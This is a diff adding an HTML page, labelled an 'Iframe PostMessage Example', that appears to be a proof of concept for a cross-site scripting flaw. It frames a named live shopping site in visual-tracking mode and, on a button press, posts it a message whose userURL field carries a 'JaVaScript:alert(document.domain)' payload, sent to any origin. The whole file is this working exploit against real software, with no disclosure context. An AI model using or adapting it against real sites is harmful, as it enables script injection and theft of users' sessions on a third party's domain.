@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Iframe PostMessage Example</title>
+    <style>
+        iframe {
+            width: 600px;
+            height: 400px;
+            border: 1px solid #ccc;
+        }
+    </style>
+</head>
+<body>
+    <h2>Parent Page</h2>
+    <button id="sendMessageBtn">Send Message to Iframe</button>
+    <iframe id="myIframe" src="https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true" name="myIframe"></iframe>
+
+    <script>
+        document.getElementById('sendMessageBtn').onclick = function() {
+            const iframe = document.getElementById('myIframe');
+            iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:alert(document.domain)"}},"*")
+        };
+    </script>
+</body>
+</html>
